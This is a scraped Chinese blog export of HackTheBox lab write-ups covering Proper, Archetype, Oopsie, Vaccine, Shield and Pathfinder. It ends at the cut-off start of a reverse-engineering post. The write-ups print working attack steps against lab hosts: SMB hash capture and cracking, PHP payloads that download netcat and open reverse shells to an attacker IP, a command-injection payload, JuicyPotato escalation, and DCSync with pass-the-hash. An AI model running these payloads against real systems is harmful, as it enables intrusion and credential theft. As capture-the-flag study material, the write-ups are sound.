http://10.10.10.231/licenses/licenses.php?theme=http://10.10.16.7:9998/&amp;h=c68113684a9e7ddca835d8f0235e2759[2] include(): http:// wrapper is disabled in the server configuration by allow_url_include=0On line 36 in file C:\\inetpub\\wwwroot\\functions.php 不能使用http协议 12python3 smbserver.py -ip 10.10.16.7 -smb2support evil .curl http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7&amp;h=b1a3d9ecf02d4854f3a730f8b2a9af5d 123456[*] Incoming connection (10.10.10.231,51174)[*] AUTHENTICATE_MESSAGE (PROPER\\web,PROPER)[*] User PROPER\\web authenticated successfully[*] web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000[*] Closing down connection (10.10.10.231,51174)[*] Remaining connections [] 拿到Hash 12345cat hash web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000john --wordlist=/usr/share/wordlists/rockyou.txt hashcharlotte123! (web) 得到凭证 1web:charlotte123! 重启smb服务 1python3 smbserver.py -ip 10.10.16.7 -username web -password charlotte123! -smb2support yolo . 12if (strpos(file_get_contents($file),&#x27;&lt;?&#x27;) === false) &#123; include($file); //&lt;&lt;&lt;&lt;&lt; Error encountered in this line. 通过竞争修改本地文件内容来进行Bypass 123456#!/bin/bashpayload=$1while((1))do echo &quot;$payload&quot; &gt; header.incdone GetShell 1&lt;?php echo &quot;hacked&quot;;system(&quot;cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\yolo.exe&quot;); ?&gt; 1&lt;?php echo &quot;hacked&quot;;system(&quot;cmd /c start \\windows\\system32\\spool\\drivers\\color\\yolo.exe -e cmd 10.10.16.7 9990&quot;); ?&gt; 123456789101112131415161718192021222324252627282930#!/usr/bin/env python3import requestsimport randomimport threadingdef thd(): _ = 0 while _ &lt; 100: req = requests.session() login_url = &quot;http://10.10.10.231/licenses/index.php&quot; username = &quot;vikki.solomon@throwaway.mail&quot; password = &quot;password1&quot; data = &#123;&quot;username&quot;:username, &quot;password&quot;:password&#125; res = req.post(url=login_url, data=data) index_url = &quot;http://10.10.10.231/licenses/licenses.php&quot; res = req.get(url=index_url) payload_url = &quot;http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7/yolo&amp;h=05e45a8f5f58f601063e937929048fd7&quot; res = req.get(url=payload_url) if &quot;hacked&quot; in res.text: print(res.text) logout_url = &quot;http://10.10.10.231/licenses/logout.php&quot; res = req.get(url=logout_url) _ += 1poll = []for i in range(0, 5): single_thd = threading.Thread(target=thd) poll.append(single_thd)for n in poll: n.start() 1cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\nc64.exe 不行 1cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\yolo.exe 行 不知道触发了什么奇怪的bug, 改个文件名就能写入了 家目录下就能写, 害隔着World-Writable呢 12type c:\\users\\web\\desktop\\user.txt540dbda93520798e554345539fe38988 权限提升 12345dir \\&quot;Program Files&quot;\\cleanup11/15/2020 05:03 AM 2,999,808 client.exe11/15/2020 10:22 AM 174 README.md11/15/2020 06:20 AM 3,041,792 server.exe FTP莫名其妙用不了 传文件只能曲线救国了 Apache2允许PUT但是不能直接上传文件 不过文件会进行流量传输 所以就监听流量然后还原文件 逆向没逆明白, 只能看Raid上的WP了 先做一个链接 1mklink /j \\users\\web\\downloads\\yoloyolo \\users\\administrator\\desktop 操控管道\\\\.\\pipe\\cleanuppipe 1echo CLEAN \\users\\web\\downloads\\yoloyolo\\root.txtx &gt; \\\\.\\pipe\\cleanuppipe 此时Server.exe会通过管道的内容来运行程序, 会将程序加密并移动至\\programdata\\cleanup(这个程序应该是administrator运行的) 删掉链接, 创建文件夹, 再还原文件 123456rmdir \\users\\web\\downloads\\yoloyolomkdir \\users\\web\\downloads\\yoloyoloecho RESTORE \\users\\web\\downloads\\yoloyolo\\root.txtx &gt; \\\\.\\pipe\\cleanuppipetype \\users\\web\\downloads\\yoloyolo\\root.txtf2167014736b2934e9721962b525f674 这台机子的姿势太骚了 What a machine. EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"}]},{"title":"HackTheBox_Start_Point","slug":"HackTheBox-Start-Point","date":"2021-06-04T16:26:01.000Z","updated":"2023-02-14T15:32:40.000Z","comments":true,"path":"2021/06/04/HackTheBox-Start-Point/","link":"","permalink":"https://yoloyolo.top/2021/06/04/HackTheBox-Start-Point/","excerpt":"借着HTB多学一些Windows下的渗透技巧","text":"借着HTB多学一些Windows下的渗透技巧 HackTheBox_Archetype Windows 端口扫描 1234567891011nmap -sV -sT -Pn 10.10.10.27Nmap scan report for 10.10.10.27Host is up (0.51s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 漏洞利用 用smbmap先扫描一波SMB服务 12smbmap -H 10.10.10.27[+] IP: 10.10.10.27:445 Name: 10.10.10.27 随便加个用户名 12345678smbmap -H 10.10.10.27 -u test[+] Guest session IP: 10.10.10.27:445 Name: 10.10.10.27 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin backups READ ONLY C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC 空密码即可登入 1234567891011smbclient \\\\\\\\10.10.10.27\\\\backups -U testEnter WORKGROUP\\test&#x27;s password: Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; dir . D 0 Fri Jun 4 12:10:59 2021 .. D 0 Fri Jun 4 12:10:59 2021 prod.dtsConfig AR 609 Mon Jan 20 20:23:02 2020 schtasks.txt A 174006 Fri Jun 4 12:05:57 2021 services.txt A 6370 Fri Jun 4 12:10:59 2021 10328063 blocks of size 4096. 8165400 blocks available 12smb: \\&gt; get prod.dtsConfiggetting file \\prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec) 12345678&lt;DTSConfiguration&gt; &lt;DTSConfigurationHeading&gt; &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;&quot;/&gt; &lt;/DTSConfigurationHeading&gt; &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt; &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt; &lt;/Configuration&gt;&lt;/DTSConfiguration&gt; 得到MSSQL账户ARCHETYPE\\sql_svc:M3g4c0rp123 这里使用impacket来登入 https://github.com/SecureAuthCorp/impacket 可以执行系统命令 123456789101112131415161718192021222324252627282930python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-authImpacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth CorporationPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(ARCHETYPE): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commandsSQL&gt; enable_xp_cmdshell[*] INFO(ARCHETYPE): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.[*] INFO(ARCHETYPE): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.SQL&gt; xp_cmdshell whoamioutput -------------------------------------------------------------------------------- archetype\\sql_svc NULL SQL&gt; xp_cmdshell type C:\\users\\sql_svc\\desktop\\user.txtoutput -------------------------------------------------------------------------------- 3e7b102e78218e935bf3f4951fec21a3 权限提升 C:\\users\\sql_svc\\appdata为隐藏路径, 需要使用dir /a 12345678910SQL&gt; xp_cmdshell type C:\\users\\sql_svc\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\ConsoleHost_history.txtoutput -------------------------------------------------------------------------------- net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!! exit NULL 通过查看powershell的历史记录得到administrator的账户 Archetype\\administrator:MEGACORP_4dm1n!! 在使用impacket中的psexec.py来得到管理员权限的Shell 12345678910111213141516python psexec.py archetype/administrator@10.10.10.27Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth CorporationPassword:[*] Requesting shares on 10.10.10.27.....[*] Found writable share ADMIN$[*] Uploading file OFvCNrQJ.exe[*] Opening SVCManager on 10.10.10.27.....[*] Creating service SMtb on 10.10.10.27.....[*] Starting service SMtb.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;type C:\\users\\administrator\\desktop\\root.txtb91ccec3305e98240082d4474b848528 尝试不使用psexec运行管理员权限命令的一波三折 Windows下可以使用runas命令来以其他用户的身份运行命令 如runas /savecred /user:administrator whoami 但是不能直接通过参数输入密码 123runas /savecred /user:administrator whoami试图将 whoami 作为用户 &quot;DOMAIN\\administrator&quot; 启动...输入 administrator 的密码: 密码的输入需要以交互式的方式来输入, 就无法在MSSQL的非交互式Shell中直接提权 而可以使用sanur这个工具来进行密码的命令行输入 1runas /savecred /user:administrator whoami | sanur.exe password 但是紧接着问题又来了 runas貌似不会在当前cmd窗口运行命令而是在一个新的cmd中运行, 这样的话就不能在MSSQL的Shell中看到回显 所以尝试了文件写入保存命令运行结果的方法 1runas /savecred /user:administrator &quot;cmd /c whoami &gt; C:\\1&quot; | sanur.exe password 本地运行成功了, 但是目标机器不行(无奈) HackTheBox_Oopsie Linux 端口扫描 123456789nmap -sV -sT -Pn 10.10.10.28Nmap scan report for 10.10.10.28Host is up (0.68s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 漏洞利用 在首页的源码看到这样一条JS 1&lt;script src=&quot;/cdn-cgi/login/script.js&quot;&gt;&lt;/script&gt; 得到路径/cdn-cgi/login 访问该路径即为登入页面 这里的登入需要使用上一台靶机的Administrator密码, 有点坑 admin:MEGACORP_4dm1n!! 访问/cdn-cgi/login/admin.php?content=uploads 提示This action require super admin rights. 且Cookie中的内容为user=34322; role=admin 那么只要能够得到super admin的id值与username即可越权 /cdn-cgi/login/admin.php?content=accounts&amp;id=1 访问该路径可以得到admin的账户信息 可以通过爆破参数id来得到super admin的信息 12345678910import reimport requestsreq = requests.session()headers = &#123;&quot;Cookie&quot;:&quot;user=34322; role=admin&quot;&#125;for _ in range(0, 999): url = &quot;http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=&#123;&#125;&quot;.format(_) res = req.get(url, headers = headers) if &quot;super&quot; in res.text: print(_) exit() id为30, 得到如下信息 12Access ID Name Email86575 super admin superadmin@megacorp.com 通过在Burpsuite中修改Cookie为Cookie: user=86575; role=super admin来访问/cdn-cgi/login/admin.php?content=uploads 上传weevely的Shell即可获得权限 权限提升 使用python反弹Shell到本机 123python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.16.51&#x27;,9996));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;-------nc -lvnp 9996 获得tty (好像是用于获取一个终端会话, 否则后续的切换用户操作无法进行) 1python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; 之前查看用户信息的页面应该用到了SQL的操作 那么就可以去找SQL的配置信息 1234567cat /var/www/html/cdn-cgi/login/db.php&lt;i/login$ cat cat /var/www/html/cdn-cgi/login/db.phpcat: cat: No such file or directory&lt;?php$conn = mysqli_connect(&#x27;localhost&#x27;,&#x27;robert&#x27;,&#x27;M3g4C0rpUs3r!&#x27;,&#x27;garage&#x27;);?&gt; 得到账户信息robert:M3g4C0rpUs3r! 使用该账户信息切换到用户robert 12345su robertM3g4C0rpUs3r!cat /home/robert/user.txtf2c74ee8db7983851ab2a96a44eb7981 查找有SUID权限的文件 1find / -user root -perm -4000 -print 2&gt;/dev/null 看到一个有意思的文件 1/usr/bin/bugtracker 而该用户也有运行权限 12345ls -la /usr/bin/bugtracker-rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtrackeriduid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker) IDA中分析 12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp)&#123; __uid_t v3; // eax const char *v4; // rax char v7[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); printf(&quot;%s&quot;, &quot;\\n------------------\\n: EV Bug Tracker :\\n------------------\\n\\n&quot;); printf(&quot;Provide Bug ID: &quot;); __isoc99_scanf(&quot;%s&quot;, v7); printf(&quot;%s&quot;, &quot;---------------\\n\\n&quot;); v3 = geteuid(); setuid(v3); v4 = (const char *)concat(&quot;cat /root/reports/&quot;, v7); system(v4); putchar(10); return __readfsqword(0x28u) ^ v8;&#125; 用户输入v7 v7被拼接到&quot;cat /root/reports/&quot;之后在赋值给v4 执行v4 命令注入 Payload: ;cat$IFS$9/root/root.txt 1234567891011./bugtracker------------------: EV Bug Tracker :------------------Provide Bug ID: ;cat$IFS$9/root/root.txt---------------cat: /root/reports/: Is a directoryaf13b0bee69f8a877c3faf667f7beacf HackTheBox_Archetype Linux 端口扫描 12345678910nmap -sV -sT -Pn 10.10.10.46Nmap scan report for 10.10.10.46Host is up (0.59s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 漏洞利用 The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server. – 官方WP 尝试使用上台靶机中获取的ftp凭据ftpuser/mc@F1l3ZilL4登录靶机的ftp服务 https://blog.csdn.net/qianxiaoyiran311/article/details/105988795 得到FTP账户 1ftpuser:mc@F1l3ZilL4 登入FTP服务 1234567891011121314151617181920ftp 10.10.10.46Connected to 10.10.10.46.220 (vsFTPd 3.0.3)Name (10.10.10.46:root): ftpuser331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 2533 Feb 03 2020 backup.zip226 Directory send OK.ftp&gt; get backup.ziplocal: backup.zip remote: backup.zip200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for backup.zip (2533 bytes).226 Transfer complete.2533 bytes received in 0.23 secs (10.7549 kB/s) 爆破加密压缩包backup.zip 123fcrackzip backup.zip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -uPASSWORD FOUND!!!!: pw &#x3D;&#x3D; 741852963 查看index.php 123456789&lt;?phpsession_start(); if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;])) &#123; if($_POST[&#x27;username&#x27;] === &#x27;admin&#x27; &amp;&amp; md5($_POST[&#x27;password&#x27;]) === &quot;2cb42f8734ea607eefed3b70af13bbd3&quot;) &#123; $_SESSION[&#x27;login&#x27;] = &quot;true&quot;; header(&quot;Location: dashboard.php&quot;); &#125; &#125;?&gt; 爆破Hash 12345678910echo -n &quot;2cb42f8734ea607eefed3b70af13bbd3&quot; &gt; passwdjohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passwdUsing default input encoding: UTF-8Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])Warning: no OpenMP support for this hash type, consider --fork=2Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusqwerty789 (?)1g 0:00:00:00 DONE (2021-06-05 19:16) 33.33g/s 3340Kp/s 3340Kc/s 3340KC/s shunda..pogimoUse the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliablySession complete 登入Web页面, 看到一个搜索功能 使用sqlmap来getshell 1sqlmap -u &quot;http://10.10.10.46/dashboard.php?search=1&quot; --os-shell sqlmap给出的shell不是很好用, 自己再弹个Shell 123rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.51 9996 &gt;/tmp/y------nc -lvnp 9996 权限提升 查看数据库信息 123cat /var/www/html/dashboard.php$conn = pg_connect(&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;); 得到账户 1postgres:P@s5w0rd! SSH登入 12ssh postgres@10.10.10.46P@s5w0rd! 查看sudo权限 123456789sudo -l[sudo] password for postgres: P@s5w0rd!Matching Defaults entries for postgres on vaccine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser postgres may run the following commands on vaccine: (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf vi提权 12/bin/vi /etc/postgresql/11/main/pg_hba.conf:shell 12cat /root/root.txtdd6e058e814260bc70e9bbdef2715849 来自上一台靶机的FTP账户 本着实践出真知的精神, 再看了一下上一台靶机Oopsie的端口开放情况 123456789netstat -antlpProto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 1205/mysqld tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 800/systemd-resolve tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1120/sshd tcp 0 235 10.10.10.28:41042 10.10.16.51:9996 ESTABLISHED 2166/python3 tcp6 0 0 :::80 :::* LISTEN 1260/apache2 tcp6 0 0 :::22 :::* LISTEN 1120/sshd tcp6 0 0 10.10.10.28:80 10.10.16.51:58936 ESTABLISHED 1963/apache2 并没有FTP服务, 那么就是可能这种靶机顺序关系的变更 我个人不是很认同这种把敏感信息放在其他靶机泄露的设计 确切来说, 不应该把这种通过其他靶机泄露敏感信息作为唯一的攻击链 在给出这样的一条攻击链的时候应该再给出另外一个攻击链 虽然这样的确能够对于连续的靶机渗透, 或者说多层靶机渗透的带来更加贯通的体验 但是出现了这种顺序变更的情况之后就会显得十分弄巧成拙, 而且没有应有的后续修改 没有user.txt也只是给这台机器的2.7分锦上添花了 HackTheBox_Shield Windows 端口扫描 123456789nmap -sV -sT -Pn 10.10.10.29Nmap scan report for 10.10.10.29Host is up (0.38s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.03306/tcp open mysql MySQL (unauthorized)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 路径扫描 扫描到路径/wordpress 其实根本没扫, 网络环境太差了, 直接看WP的 漏洞利用 123456789wpscan --url http://10.10.10.29/wordpress/ -e u[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.10.29/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) 使用上一台靶机的密码P@s5w0rd! 得到账户admin:P@s5w0rd! 拳头硬了 登入之后修改插件的代码 直接写个Shell进去 然后访问/wordpress/wp-content/plugins/mesmerize-companion/src/Companion.php即可 权限提升 蚁剑连WebShell 上传nc再弹Shell回来 123nc64.exe -e C:\\windows\\system32\\cmd.exe 10.10.16.51 9996-------nc -lvnp 9996 12345678910111213141516171819202122232425262728293031323334353637383940414243systeminfoHost Name: SHIELDOS Name: Microsoft Windows Server 2016 StandardOS Version: 10.0.14393 N/A Build 14393OS Manufacturer: Microsoft CorporationOS Configuration: Member ServerOS Build Type: Multiprocessor FreeRegistered Owner: Windows UserRegistered Organization: Product ID: 00376-30000-00299-AA303Original Install Date: 2/4/2020, 12:58:01 PMSystem Boot Time: 6/5/2021, 8:21:33 PMSystem Manufacturer: VMware, Inc.System Model: VMware7,1System Type: x64-based PCProcessor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 MhzBIOS Version: VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019Windows Directory: C:\\WindowsSystem Directory: C:\\Windows\\system32Boot Device: \\Device\\HarddiskVolume2System Locale: en-us;English (United States)Input Locale: en-us;English (United States)Time Zone: (UTC-08:00) Pacific Time (US &amp; Canada)Total Physical Memory: 2,047 MBAvailable Physical Memory: 753 MBVirtual Memory: Max Size: 2,431 MBVirtual Memory: Available: 1,015 MBVirtual Memory: In Use: 1,416 MBPage File Location(s): C:\\pagefile.sysDomain: MEGACORP.LOCALLogon Server: N/AHotfix(s): N/ANetwork Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 2 DHCP Enabled: No IP address(es) [01]: 10.10.10.29 [02]: fe80::98f9:2cd0:ff27:3fbc [03]: dead:beef::98f9:2cd0:ff27:3fbcHyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. 没有打补丁的Windows Server 2016 Standard 用烂土豆提权 https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe 写一个反弹Shell的bat脚本 1echo start C:\\temp\\nc64.exe -e cmd.exe 10.10.16.51 9995 &gt; C:\\temp\\shell.bat 当时因为用linux的习惯就用了双引号把要写入的内容括了起来, 但是Windows会很蛋疼得把双引号也写入, 然后就导致了当时一直不能提权 看一下权限 12345678910whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ======================= ========================================= =======SeChangeNotifyPrivilege Bypass traverse checking EnabledSeImpersonatePrivilege Impersonate a client after authentication EnabledSeCreateGlobalPrivilege Create global objects Enabled 如果开启SeImpersonate权限，juicypotato的参数可以使用-t t 如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u 如果均开启，可以选择-t * 如果均未开启，那么无法提权 https://blog.csdn.net/god_zzZ/article/details/106334702 然后在项目上找一个Windows Server 2016 Standard的CLSID 123JuicyPotato.exe -t t -p C:\\temp\\shell.bat -l 6666 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;------nc -lvnp 9995 12type c:\\users\\administrator\\desktop\\root.txt6e9a9fdc6f64e410a68b847bb4b404fa HackTheBox_Pathfinder 对于域控的攻击有点超出的我的知识范围了 端口扫描 1234567891011121314151617181920nmap -sV -sT -p 1-10000 10.10.10.30Nmap scan report for 10.10.10.30Host is up (0.57s latency).Not shown: 9987 closed portsPORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-06-08 13:22:07Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)9389/tcp open mc-nmf .NET Message FramingService Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows 使用上一台靶机的凭证sandra:Password1234!来枚举AD的信息 – 官方WP 1bloodhound-python -d megacorp.local -u sandra -p &quot;Password1234!&quot; -gc pathfinder.megacorp.local -c all -ns 10.10.10.30 12neo4j consolebloodhound json打包为zip后放进bloodhound 自己用在kali用bloodhound的时候总是莫名其妙的崩溃, 只能在windows上使用了 需要改一下neo4j所监听的ip, 默认是监听本地环回, 需要改成一个windows上能够访问到的ip 通过分析Find Principals with DCSync Rights 可以看到用户SVC_BES有权限GetChanges&amp;GetchangesAll “With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz” https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall mimikatz有一个dcsync功能, 可以利用卷影拷贝服务直接读取ntds.dll文件并检索域散列值。 《内网安全攻防》 P.296 如果能够拿到用户svc_bes的凭证, 就能够使用dcsync攻击 所以尝试获取用户svc_bes的Hash 1234python GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30[*] Getting TGT for svc_bes$krb5asrep$23$svc_bes@MEGACORP.LOCAL:9b7a931e1152a4631d23173e921373ee$7282d47fdf6ebddcd09f8233636ee97c971b39333ded23097d3fb59c4fb1dfbd772cb3b08b8a8f40a69f69a07f242e0ee2520878b707ab9769208ba2bd6faa76c0a79b39384ef588651127c3164fff013b53d0968d4047dad049b46747b52629c6c9b92427fc7bd6dca13a923bdb833ca9273c2018b605a9eeb0c24005b5ba8988b76952db3a31f6b14f165bd0613e7130ee1bc93cb9a0e4f7a018cbf3913b935778e860d3236d2763b56d871e236e98ea041bbb5b15ebf3138ca16214a758b24194d968320151e58d09a89c2d08e4576ab789076cba4096b4fb328965611663cbe588eafd5bf19af71293701d8a220e 爆破Hash 123john --wordlist=/usr/share/wordlists/rockyou.txt hashSheffield19 ($krb5asrep$23$svc_bes@MEGACORP.LOCAL) 这里本来打算用psexec直接登入, 但是出现了权限不足的错误 python psexec.py megacorp.local/svc_bes@10.10.10.30 使用Winrm服务登入 123evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19type C:\\users\\svc_bes\\desktop\\user.txtb05fb166688a8603d970c6d033f637f1 dcsync攻击 12secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18::: 使用Hash登入 123python psexec.py megacorp.local/administraor@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18type c:\\users\\administrator\\desktop\\root.txtee613b2d048303e5fd4ac6647d944645 几台靶机下来还是学到了不少东西 还是自己太菜了 剩下的StartPoint靶机需要VIP才能访问 等哪天心血来潮开了VIP再说吧 EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"}]},{"title":"Reverse_3","slug":"Reverse-3","date":"2021-05-31T21:16:43.000Z","updated":"2021-06-10T14:25:58.000Z","comments":true,"path":"2021/05/31/Reverse-3/","link":"","permalink":"https://yoloyolo.top/2021/05/31/Reverse-3/","excerpt":"随缘刷题","text":"随缘刷题 [网鼎杯 2020 青龙组]singal 链接: https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]singal EXE 32 IDA中 _main 函数反编译结果如下 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4[117]; // [esp+18h] [ebp-1D4h] BYREF __main(); qmemcpy(v4, dword_403040, 456u); vm_operad(v4, 114); puts(&quot;good,The answer format is:flag &#123;&#125;&quot;); return 0;&#125; 这里dword_403040只运算最低一字节 123456789dword_403040 = [0x0A, 0x04, 0x10, 0x08, 0x03, 0x05, 0x01, 0x04, 0x20, 0x08, 0x05, 0x03, 0x01, 0x03, 0x02, 0x08, 0x0B, 0x01, 